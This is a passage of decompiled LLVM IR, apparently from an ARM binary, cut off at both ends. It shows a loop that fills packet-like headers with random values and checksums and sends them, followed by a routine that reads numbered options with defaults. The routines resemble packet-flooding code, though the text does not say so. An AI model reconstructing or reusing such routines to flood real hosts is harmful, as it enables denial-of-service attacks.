  store i8 %v5_bda8, i8* %v4_bf34, align 1
  %v3_bf38 = load i32, i32* %stack_var_-48, align 4
  %v3_bf3c = mul i32 %v3_bf38, 65536
  %v1_bf40 = add i32 %v3_bf3c, 2097152
  %v3_bf44 = udiv i32 %v1_bf40, 256
  %v4_bf4c = udiv i32 %v1_bf40, 16777216
  %v5_bf4c = or i32 %v3_bf44, %v4_bf4c
  %v3_bf50 = urem i32 %v3_bf38, 65536
  store i32 %v3_bf50, i32* %r2.global-to-local, align 4
  %v1_bf54 = trunc i32 %v5_bf4c to i16
  %v2_bf54 = load i32, i32* @lr, align 4
  %v3_bf54 = add i32 %v2_bf54, 2
  %v4_bf54 = inttoptr i32 %v3_bf54 to i16*
  store i16 %v1_bf54, i16* %v4_bf54, align 2
  %v0_bf58 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf58 = mul i32 %v0_bf58, 65536
  %v3_bf60 = add i32 %v1_bf58, 786432
  store i32 %v3_bf60, i32* %r2.global-to-local, align 4
  store i32 %v1_bdf0, i32* %ip.global-to-local, align 4
  %v2_bf68 = load i32, i32* @lr, align 4
  %v3_bf68 = add i32 %v2_bf68, 8
  %v4_bf68 = inttoptr i32 %v3_bf68 to i8*
  store i8 %v1_bf68, i8* %v4_bf68, align 1
  %v0_bf6c = load i32, i32* %r2.global-to-local, align 4
  %v3_bf6c = udiv i32 %v0_bf6c, 256
  %v1_bf70 = and i32 %v3_bf6c, 65280
  %v0_bf74 = load i32, i32* %ip.global-to-local, align 4
  %v2_bf74 = icmp eq i32 %v0_bf74, 0
  store i1 %v2_bf74, i1* %cpsr_z.global-to-local, align 1
  %v4_bf78 = udiv i32 %v0_bf6c, 16777216
  %v5_bf78 = or i32 %v1_bf70, %v4_bf78
  store i32 %v5_bf78, i32* %ip.global-to-local, align 4
  %v2_bf80 = load i32, i32* @lr, align 4
  %v3_bf80 = add i32 %v2_bf80, 9
  %v4_bf80 = inttoptr i32 %v3_bf80 to i8*
  store i8 17, i8* %v4_bf80, align 1
  store i32 ptrtoint (i32* @global_var_20a5c.46 to i32), i32* %r3.global-to-local, align 4
  %v0_bf88 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bf88, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bee4
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_bf8c = load i32, i32* @lr, align 4
  %v4_bf8c = add i32 %v3_bf8c, 6
  %v5_bf8c = inttoptr i32 %v4_bf8c to i16*
  store i16 64, i16* %v5_bf8c, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bee4, %bb
  %v2_bf90 = load i32, i32* @global_var_20a5c.46, align 4
  %v1_bf94 = load i32, i32* @lr, align 4
  %v2_bf94 = add i32 %v1_bf94, 12
  %v3_bf94 = inttoptr i32 %v2_bf94 to i32*
  store i32 %v2_bf90, i32* %v3_bf94, align 4
  store i32 %v2_bf00, i32* %r2.global-to-local, align 4
  %v1_bf9c = add i32 %v2_bf00, 16
  %v2_bf9c = inttoptr i32 %v1_bf9c to i32*
  %v3_bf9c = load i32, i32* %v2_bf9c, align 4
  %v1_bfa0 = load i32, i32* @lr, align 4
  %v2_bfa0 = add i32 %v1_bfa0, 16
  %v3_bfa0 = inttoptr i32 %v2_bfa0 to i32*
  store i32 %v3_bf9c, i32* %v3_bfa0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_bfa8 = load i32, i32* @lr, align 4
  %v1_bfa8 = add i32 %v0_bfa8, 20
  store i32 %v1_bfa8, i32* %r4.global-to-local, align 4
  %v2_bfac = add i32 %v0_bfa8, 28
  %v3_bfac = inttoptr i32 %v2_bfac to i32*
  store i32 -1, i32* %v3_bfac, align 4
  %v0_bfb0 = load i32, i32* @r5, align 4
  %v1_bfb0 = trunc i32 %v0_bfb0 to i16
  %v2_bfb0 = load i32, i32* @lr, align 4
  %v3_bfb0 = add i32 %v2_bfb0, 4
  %v4_bfb0 = inttoptr i32 %v3_bfb0 to i16*
  store i16 %v1_bfb0, i16* %v4_bfb0, align 2
  %v0_bfb4 = load i32, i32* @lr, align 4
  %v1_bfb4 = add i32 %v0_bfb4, 32
  %v0_bfb8 = load i32, i32* %ip.global-to-local, align 4
  %v1_bfb8 = trunc i32 %v0_bfb8 to i16
  %v2_bfb8 = load i32, i32* %r4.global-to-local, align 4
  %v3_bfb8 = add i32 %v2_bfb8, 4
  %v4_bfb8 = inttoptr i32 %v3_bfb8 to i16*
  store i16 %v1_bfb8, i16* %v4_bfb8, align 2
  %v0_bfbc = load i32, i32* @r7, align 4
  %v1_bfbc = trunc i32 %v0_bfbc to i16
  %v2_bfbc = load i32, i32* %r4.global-to-local, align 4
  %v3_bfbc = add i32 %v2_bfbc, 2
  %v4_bfbc = inttoptr i32 %v3_bfbc to i16*
  store i16 %v1_bfbc, i16* %v4_bfbc, align 2
  %v0_bfc0 = load i32, i32* @r6, align 4
  %v1_bfc0 = trunc i32 %v0_bfc0 to i16
  %v2_bfc0 = load i32, i32* @lr, align 4
  %v3_bfc0 = add i32 %v2_bfc0, 20
  %v4_bfc0 = inttoptr i32 %v3_bfc0 to i16*
  store i16 %v1_bfc0, i16* %v4_bfc0, align 2
  %v3_bfc4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_bfc4, i32* %r2.global-to-local, align 4
  %v3_bfc8 = call i32 @function_1038c(i32 %v1_bfb4, i32 %v3_be3c, i32 %v3_bfc4)
  %v3_bfcc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bfcc, i32* %r3.global-to-local, align 4
  %v1_bfd0 = add i32 %v3_bfcc, 1
  store i32 %v1_bfd0, i32* @r4, align 4
  %v1_bfd4 = load i32, i32* @r8, align 4
  %v9_bfd4 = icmp eq i32 %v1_bfd0, %v1_bfd4
  store i1 %v9_bfd4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bfd0, i32* %stack_var_-44, align 4
  %v5_bfdc = icmp slt i32 %v1_bfd0, %v1_bfd4
  br i1 %v5_bfdc, label %dec_label_pc_bee4, label %dec_label_pc_bfe0.preheader

dec_label_pc_bfe0.preheader:                      ; preds = %.thread, %dec_label_pc_be88
  %v0_bfe4.ph = phi i32 [ 0, %dec_label_pc_be88 ], [ %v1_bfd4, %.thread ]
  %v3_c020 = icmp eq i32 %v3_be98, 65535
  br label %dec_label_pc_bfe0

dec_label_pc_bfe0:                                ; preds = %dec_label_pc_bfe0, %dec_label_pc_c0cc, %dec_label_pc_bfe0.preheader
  %v0_bfe4 = phi i32 [ %v0_bfe4.ph, %dec_label_pc_bfe0.preheader ], [ 0, %dec_label_pc_c0cc ], [ 0, %dec_label_pc_bfe0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bfe4 = icmp eq i32 %v0_bfe4, 0
  store i1 %v2_bfe4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bfe4, label %dec_label_pc_bfe0, label %dec_label_pc_bff0

dec_label_pc_bff0:                                ; preds = %dec_label_pc_bfe0, %dec_label_pc_c0cc
  br label %dec_label_pc_bff4

dec_label_pc_bff4:                                ; preds = %dec_label_pc_c040, %dec_label_pc_bff0
  %v1_c004 = phi i32 [ %v1_c0bc, %dec_label_pc_c040 ], [ 0, %dec_label_pc_bff0 ]
  %v5_bff8 = mul i32 %v1_c004, 24
  %v1_bffc = load i32, i32* @sl, align 4
  %v2_bffc = add i32 %v1_bffc, %v5_bff8
  store i32 %v2_bffc, i32* %r3.global-to-local, align 4
  %v1_c000 = add i32 %v2_bffc, 20
  %v2_c000 = inttoptr i32 %v1_c000 to i8*
  %v3_c000 = load i8, i8* %v2_c000, align 1
  %v4_c000 = zext i8 %v3_c000 to i32
  store i32 %v4_c000, i32* %r2.global-to-local, align 4
  %v0_c004 = load i32, i32* @fp, align 4
  %v4_c004 = mul i32 %v1_c004, 4
  %v5_c004 = add i32 %v0_c004, %v4_c004
  %v6_c004 = inttoptr i32 %v5_c004 to i32*
  %v7_c004 = load i32, i32* %v6_c004, align 4
  store i32 %v7_c004, i32* @r5, align 4
  %v7_c00c = icmp eq i8 %v3_c000, 31
  store i1 %v7_c00c, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_c014 = add i32 %v7_c004, 20
  store i32 %v1_c014, i32* @r6, align 4
  %tmp39 = icmp ult i8 %v3_c000, 32
  br i1 %tmp39, label %dec_label_pc_c0e0, label %dec_label_pc_c01c

dec_label_pc_c01c:                                ; preds = %dec_label_pc_bff4
  store i32 %v3_be98, i32* %r3.global-to-local, align 4
  store i1 %v3_c020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c020, label %dec_label_pc_c140, label %dec_label_pc_c028

dec_label_pc_c028:                                ; preds = %dec_label_pc_c0e0, %dec_label_pc_c01c
  %v1_c02c = phi i32 [ %v1_c138, %dec_label_pc_c0e0 ], [ 65535, %dec_label_pc_c01c ]
  store i32 %v3_be9c, i32* %ip.global-to-local, align 4
  %v9_c02c = icmp eq i32 %v3_be9c, %v1_c02c
  store i1 %v9_c02c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c02c, label %dec_label_pc_c154, label %dec_label_pc_c034

dec_label_pc_c034:                                ; preds = %dec_label_pc_c140.dec_label_pc_c034_crit_edge, %dec_label_pc_c028
  %v1_c038 = phi i32 [ %v1_c038.pre, %dec_label_pc_c140.dec_label_pc_c034_crit_edge ], [ %v1_c02c, %dec_label_pc_c028 ]
  %v9_c038 = icmp eq i32 %v3_bea0, %v1_c038
  store i1 %v9_c038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c038, label %dec_label_pc_c168, label %dec_label_pc_c040

dec_label_pc_c040:                                ; preds = %dec_label_pc_c154, %dec_label_pc_c034, %dec_label_pc_c168
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c044 = load i32, i32* @r5, align 4
  %v3_c044 = add i32 %v2_c044, 10
  %v4_c044 = inttoptr i32 %v3_c044 to i16*
  store i16 0, i16* %v4_c044, align 2
  %v0_c04c = load i32, i32* @r5, align 4
  store i32 %v0_c04c, i32* @r0, align 4
  %v2_c050 = call i32 @function_c848(i32 %v0_c04c, i32 20)
  %v3_c050 = trunc i32 %v2_c050 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c058 = load i32, i32* @r5, align 4
  %v4_c058 = add i32 %v3_c058, 10
  %v5_c058 = inttoptr i32 %v4_c058 to i16*
  store i16 %v3_c050, i16* %v5_c058, align 2
  %v0_c05c = load i32, i32* %r3.global-to-local, align 4
  %v1_c05c = trunc i32 %v0_c05c to i16
  %v2_c05c = load i32, i32* @r6, align 4
  %v3_c05c = add i32 %v2_c05c, 6
  %v4_c05c = inttoptr i32 %v3_c05c to i16*
  store i16 %v1_c05c, i16* %v4_c05c, align 2
  %v3_c060 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c060, i32* %r3.global-to-local, align 4
  %v0_c064 = load i32, i32* @r6, align 4
  store i32 %v0_c064, i32* @r1, align 4
  %v1_c068 = add i32 %v0_c064, 4
  %v2_c068 = inttoptr i32 %v1_c068 to i16*
  %v3_c068 = load i16, i16* %v2_c068, align 2
  %v4_c068 = zext i16 %v3_c068 to i32
  store i32 %v4_c068, i32* %r2.global-to-local, align 4
  %v1_c06c = add i32 %v3_c060, 12
  store i32 %v1_c06c, i32* %r3.global-to-local, align 4
  %v0_c070 = load i32, i32* @r5, align 4
  %v4_c074 = call i32 @function_c898(i32 %v0_c070, i32 %v0_c064, i32 %v4_c068, i32 %v1_c06c)
  %v5_c074 = trunc i32 %v4_c074 to i16
  %v3_c078 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c078, i32* %r3.global-to-local, align 4
  %v3_c07c = mul i32 %v3_c078, 32
  store i32 %v3_c07c, i32* %lr.global-to-local, align 4
  %v3_c080 = load i32, i32* @r6, align 4
  %v4_c080 = add i32 %v3_c080, 6
  %v5_c080 = inttoptr i32 %v4_c080 to i16*
  store i16 %v5_c074, i16* %v5_c080, align 2
  %v0_c084 = load i32, i32* %lr.global-to-local, align 4
  %v1_c084 = load i32, i32* %r3.global-to-local, align 4
  %tmp40 = mul i32 %v1_c084, -8
  %v5_c084 = add i32 %v0_c084, %tmp40
  store i32 %v5_c084, i32* %lr.global-to-local, align 4
  %v0_c088 = load i32, i32* @r6, align 4
  %v1_c088 = add i32 %v0_c088, 2
  %v2_c088 = inttoptr i32 %v1_c088 to i16*
  %v3_c088 = load i16, i16* %v2_c088, align 2
  %v3_c08c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c08c, i32* %r2.global-to-local, align 4
  %v1_c090 = load i32, i32* @sl, align 4
  %v2_c090 = add i32 %v1_c090, %v5_c084
  store i32 %v2_c090, i32* @lr, align 4
  %v3_c094 = add i32 %v2_c090, 2
  %v4_c094 = inttoptr i32 %v3_c094 to i16*
  store i16 %v3_c088, i16* %v4_c094, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c0a0 = load i32, i32* @r5, align 4
  %v0_c0a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0a4 = add i32 %v0_c0a4, 32
  store i32 %v1_c0a4, i32* %r2.global-to-local, align 4
  %v0_c0a8 = load i32, i32* @sb, align 4
  %v0_c0ac = load i32, i32* @lr, align 4
  %v6_c0b4 = call i32 @function_11570(i32 %v0_c0a8, i32 %v0_c0a0, i32 %v1_c0a4, i32 16384, i32 %v0_c0ac, i32 16)
  %v3_c0b8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0b8, i32* %r3.global-to-local, align 4
  %v1_c0bc = add i32 %v3_c0b8, 1
  %v1_c0c0 = load i32, i32* @r8, align 4
  %v9_c0c0 = icmp eq i32 %v1_c0bc, %v1_c0c0
  store i1 %v9_c0c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c0bc, i32* %stack_var_-44, align 4
  %v5_c0c8 = icmp slt i32 %v1_c0bc, %v1_c0c0
  br i1 %v5_c0c8, label %dec_label_pc_bff4, label %dec_label_pc_c0cc

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c040
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c0d0 = icmp eq i32 %v1_c0c0, 0
  store i1 %v2_c0d0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c0d0, label %dec_label_pc_bfe0, label %dec_label_pc_bff0

dec_label_pc_c0e0:                                ; preds = %dec_label_pc_bff4
  %v1_c0e0 = add i32 %v2_bffc, 16
  %v2_c0e0 = inttoptr i32 %v1_c0e0 to i32*
  %v3_c0e0 = load i32, i32* %v2_c0e0, align 4
  store i32 %v3_c0e0, i32* @r4, align 4
  %v0_c0e4 = call i32 @function_e0b8()
  %v3_c0e8 = load i32, i32* %stack_var_-44, align 4
  %v5_c0f0 = mul i32 %v3_c0e8, 24
  %v0_c0f4 = load i32, i32* @r4, align 4
  %v1_c0f4 = and i32 %v0_c0f4, 16711680
  store i32 %v1_c0f4, i32* %ip.global-to-local, align 4
  %v3_c0f8 = udiv i32 %v0_c0f4, 16777216
  %v4_c0fc = udiv i32 %v1_c0f4, 256
  %v5_c0fc = or i32 %v4_c0fc, %v3_c0f8
  store i32 %v5_c0fc, i32* %r2.global-to-local, align 4
  %v1_c100 = load i32, i32* @sl, align 4
  %v2_c100 = add i32 %v1_c100, %v5_c0f0
  %v1_c104 = and i32 %v0_c0f4, 65280
  store i32 %v1_c104, i32* %r3.global-to-local, align 4
  %v1_c108 = add i32 %v2_c100, 20
  %v2_c108 = inttoptr i32 %v1_c108 to i8*
  %v3_c108 = load i8, i8* %v2_c108, align 1
  %v4_c108 = zext i8 %v3_c108 to i32
  store i32 %v4_c108, i32* %ip.global-to-local, align 4
  %v5_c110 = call i32 @llvm.bswap.i32(i32 %v0_c0f4)
  %v7_c114 = lshr i32 %v0_c0e4, %v4_c108
  %v8_c114 = add i32 %v7_c114, %v5_c110
  store i32 %v8_c114, i32* %r2.global-to-local, align 4
  %v5_c12c = call i32 @llvm.bswap.i32(i32 %v8_c114)
  %v1_c130 = load i32, i32* @r5, align 4
  %v2_c130 = add i32 %v1_c130, 16
  %v3_c130 = inttoptr i32 %v2_c130 to i32*
  store i32 %v5_c12c, i32* %v3_c130, align 4
  store i32 %v3_be98, i32* %r3.global-to-local, align 4
  %v1_c138 = load i32, i32* @r7, align 4
  %v9_c138 = icmp eq i32 %v3_be98, %v1_c138
  store i1 %v9_c138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c138, label %dec_label_pc_c140, label %dec_label_pc_c028

dec_label_pc_c140:                                ; preds = %dec_label_pc_c0e0, %dec_label_pc_c01c
  %v0_c140 = call i32 @function_e0b8()
  %v1_c140 = trunc i32 %v0_c140 to i16
  store i32 %v3_be9c, i32* %ip.global-to-local, align 4
  %v1_c148 = load i32, i32* @r7, align 4
  %v9_c148 = icmp eq i32 %v3_be9c, %v1_c148
  store i1 %v9_c148, i1* %cpsr_z.global-to-local, align 1
  %v3_c14c = load i32, i32* @r5, align 4
  %v4_c14c = add i32 %v3_c14c, 4
  %v5_c14c = inttoptr i32 %v4_c14c to i16*
  store i16 %v1_c140, i16* %v5_c14c, align 2
  br i1 %v9_c148, label %dec_label_pc_c154, label %dec_label_pc_c140.dec_label_pc_c034_crit_edge

dec_label_pc_c140.dec_label_pc_c034_crit_edge:    ; preds = %dec_label_pc_c140
  %v1_c038.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_c034

dec_label_pc_c154:                                ; preds = %dec_label_pc_c140, %dec_label_pc_c028
  %v0_c154 = call i32 @function_e0b8()
  %v1_c154 = trunc i32 %v0_c154 to i16
  %v1_c15c = load i32, i32* @r7, align 4
  %v9_c15c = icmp eq i32 %v3_bea0, %v1_c15c
  store i1 %v9_c15c, i1* %cpsr_z.global-to-local, align 1
  %v3_c160 = load i32, i32* @r5, align 4
  %v4_c160 = add i32 %v3_c160, 20
  %v5_c160 = inttoptr i32 %v4_c160 to i16*
  store i16 %v1_c154, i16* %v5_c160, align 2
  br i1 %v9_c15c, label %dec_label_pc_c168, label %dec_label_pc_c040

dec_label_pc_c168:                                ; preds = %dec_label_pc_c154, %dec_label_pc_c034
  %v0_c168 = call i32 @function_e0b8()
  %v1_c168 = trunc i32 %v0_c168 to i16
  %v3_c16c = load i32, i32* @r6, align 4
  %v4_c16c = add i32 %v3_c16c, 2
  %v5_c16c = inttoptr i32 %v4_c16c to i16*
  store i16 %v1_c168, i16* %v5_c16c, align 2
  br label %dec_label_pc_c040

dec_label_pc_c174:                                ; preds = %dec_label_pc_be60
  %v0_c174 = load i32, i32* @sb, align 4
  %v1_c178 = call i32 @function_10ddc(i32 %v0_c174)
  br label %dec_label_pc_c17c

dec_label_pc_c17c:                                ; preds = %dec_label_pc_bd54, %dec_label_pc_c174
  %v1_c184 = phi i32 [ %v3_be50, %dec_label_pc_bd54 ], [ %v1_c178, %dec_label_pc_c174 ]
  store i32 %v3_bd54, i32* %r4.global-to-local, align 4
  store i32 %v27_bd54, i32* %lr.global-to-local, align 4
  ret i32 %v1_c184

; uselistorder directives
  uselistorder i32 %v1_c138, { 1, 0 }
  uselistorder i32 %v0_c0f4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c0bc, { 2, 0, 3, 1 }
  uselistorder i32 %v5_c084, { 1, 0 }
  uselistorder i1 %v3_c020, { 1, 0 }
  uselistorder i32 %v1_bfd0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bf38, { 1, 0 }
  uselistorder i32 %v3_bed0, { 1, 0 }
  uselistorder i32 %v3_becc, { 1, 0 }
  uselistorder i32 %v0_be90, { 1, 0, 3, 2 }
  uselistorder i32 %v0_be8c, { 1, 0, 2 }
  uselistorder i32 %v0_be88, { 1, 0, 3, 2 }
  uselistorder i1 %v7_be80, { 1, 0 }
  uselistorder i1 %v7_be54, { 1, 0 }
  uselistorder i32 %v3_be50, { 1, 2, 3, 0 }
  uselistorder i32 %v1_bdf0, { 1, 2, 0 }
  uselistorder i32 %v5_bde4, { 1, 0 }
  uselistorder i32 %v6_bd88, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c17c, { 1, 0 }
  uselistorder label %dec_label_pc_c040, { 2, 0, 1 }
  uselistorder label %dec_label_pc_bff0, { 1, 0 }
  uselistorder label %dec_label_pc_bfe0, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c18c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c18c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_c18c = load i32, i32* @sb, align 4
  %v27_c18c = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_c1ac = call i32 @function_1215c(i32 %arg1, i32 4)
  %v0_c1b0 = load i32, i32* @r5, align 4
  store i32 %v0_c1b0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_c1bc = load i32, i32* @r4, align 4
  store i32 %v0_c1bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_c1c4 = inttoptr i32 %v0_c1b0 to i32*
  %v6_c1c4 = call i32 @function_8570(i32 %v0_c1bc, i32* %v5_c1c4, i32 2, i32 0, i32 %v2_c1ac)
  %v1_c1d0 = urem i32 %v6_c1c4, 256
  store i32 %v1_c1d0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c1dc = load i32, i32* @r4, align 4
  store i32 %v0_c1dc, i32* %r0.global-to-local, align 4
  %v0_c1e0 = load i32, i32* @r5, align 4
  store i32 %v0_c1e0, i32* %r1.global-to-local, align 4
  %sext22 = mul i32 %v6_c1c4, 16777216
  %v5_c1e8 = sdiv i32 %sext22, 16777216
  %v6_c1e8 = inttoptr i32 %v0_c1e0 to i32*
  %v7_c1e8 = call i32 @function_8570(i32 %v0_c1dc, i32* %v6_c1e8, i32 3, i32 65535, i32 %v5_c1e8)
  %v0_c1ec = load i32, i32* @r5, align 4
  store i32 %v0_c1ec, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_c1f8 = load i32, i32* @r4, align 4
  store i32 %v0_c1f8, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_c200 = inttoptr i32 %v0_c1ec to i32*
  %v6_c200 = call i32 @function_8570(i32 %v0_c1f8, i32* %v5_c200, i32 4, i32 64, i32 %v7_c1e8)
  %v1_c208 = urem i32 %v6_c200, 256
  store i32 %v1_c208, i32* %ip.global-to-local, align 4
  %v0_c20c = load i32, i32* @r5, align 4
  store i32 %v0_c20c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c218 = load i32, i32* @r4, align 4
  store i32 %v0_c218, i32* %r0.global-to-local, align 4
  %sext23 = mul i32 %v6_c200, 16777216
  %v5_c220 = sdiv i32 %sext23, 16777216
  %v6_c220 = inttoptr i32 %v0_c20c to i32*
  %v7_c220 = call i32 @function_8570(i32 %v0_c218, i32* %v6_c220, i32 5, i32 0, i32 %v5_c220)
  %v1_c22c = urem i32 %v7_c220, 256
  store i32 %v1_c22c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c238 = load i32, i32* @r4, align 4
  store i32 %v0_c238, i32* %r0.global-to-local, align 4
  %v0_c23c = load i32, i32* @r5, align 4
  store i32 %v0_c23c, i32* %r1.global-to-local, align 4
  %v5_c244 = inttoptr i32 %v0_c23c to i32*
  %v6_c244 = call i32 @function_8570(i32 %v0_c238, i32* %v5_c244, i32 6, i32 65535, i32 %v1_c22c)
  %v0_c248 = load i32, i32* @r5, align 4
  store i32 %v0_c248, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c254 = load i32, i32* @r4, align 4
  store i32 %v0_c254, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_c25c = inttoptr i32 %v0_c248 to i32*
  %v6_c25c = call i32 @function_8570(i32 %v0_c254, i32* %v5_c25c, i32 7, i32 53, i32 %v6_c244)
  %v0_c268 = load i32, i32* @r5, align 4
  store i32 %v0_c268, i32* %r1.global-to-local, align 4
  %v0_c26c = load i32, i32* @r4, align 4
  store i32 %v0_c26c, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_c278 = inttoptr i32 %v0_c268 to i32*
  %v6_c278 = call i32 @function_8570(i32 %v0_c26c, i32* %v5_c278, i32 9, i32 65535, i32 %v6_c25c)
  %v0_c27c = load i32, i32* @r5, align 4
  store i32 %v0_c27c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_c288 = load i32, i32* @r4, align 4
  store i32 %v0_c288, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_c290 = inttoptr i32 %v0_c27c to i32*
  %v6_c290 = call i32 @function_8570(i32 %v0_c288, i32* %v5_c290, i32 0, i32 12, i32 %v6_c278)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c29c = load i32, i32* @r5, align 4
  store i32 %v0_c29c, i32* %r1.global-to-local, align 4
  store i32 %v6_c290, i32* %sb.global-to-local, align 4
  %v0_c2a4 = load i32, i32* @r4, align 4
  store i32 %v0_c2a4, i32* %r0.global-to-local, align 4
  %v4_c2a8 = inttoptr i32 %v0_c29c to i32*
  %v5_c2a8 = call i32 @function_8190(i32 %v0_c2a4, i32* %v4_c2a8, i32 8, i32 0)
  store i32 %v5_c2a8, i32* @r7, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_c2b4 = call i32 @function_fd64(i32 24)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_c2c0 = call i32 @function_fca0(i32 24, i32* null)
  store i32 %v3_c2c0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_c2c8 = call i32 @function_109e8(i32 %v3_c2c0, i32 0)
  store i32 %v2_c2c8, i32* @r4, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_c2d4 = call i32 @function_fcc4(i32 24)
  store i32 %v1_c2d4, i32* %r0.global-to-local, align 4
  %v0_c2d8 = load i32, i32* @r4, align 4
  %v1_c2d8 = icmp slt i32 %v0_c2d8, 0
  %v2_c2d8 = icmp eq i32 %v0_c2d8, 0
  store i1 %v2_c2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_c2d8, label %dec_label_pc_c7d0, label %dec_label_pc_c2e0

dec_label_pc_c2e0:                                ; preds = %dec_label_pc_c18c
  %v2_c2e4 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_c2e4, i32* @sl, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_c2e4, i32* %r1.global-to-local, align 4
  store i32 %v0_c2d8, i32* %r0.global-to-local, align 4
  %v1_c2f4 = call i32 @function_10b74(i32 %v0_c2d8)
  store i32 %v1_c2f4, i32* @r5, align 4
  %v0_c2fc = load i32, i32* @r4, align 4
  store i32 %v0_c2fc, i32* %r0.global-to-local, align 4
  %v1_c300 = call i32 @function_10ddc(i32 %v0_c2fc)
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_c308 = call i32 @function_fd64(i32 25)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_c314 = call i32 @function_fca0(i32 25, i32* null)
  %v0_c318 = load i32, i32* @r5, align 4
  store i32 %v0_c318, i32* @r1, align 4
  store i32 %v3_c314, i32* %r2.global-to-local, align 4
  store i32 %v2_c2e4, i32* %r0.global-to-local, align 4
  %v3_c324 = bitcast i32* %stack_var_-2124 to i8*
